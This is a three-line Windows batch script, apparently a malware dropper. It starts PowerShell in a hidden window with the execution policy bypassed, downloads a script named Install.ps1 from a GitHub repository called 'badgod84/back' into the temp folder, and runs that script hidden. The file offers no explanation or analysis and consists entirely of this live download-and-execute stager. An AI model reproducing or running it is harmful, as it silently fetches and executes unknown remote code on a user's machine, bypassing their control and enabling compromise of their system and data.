@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/badgod84/back/refs/heads/main/Install.ps1', '%TEMP%\Install.ps1')"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\Install.ps1"
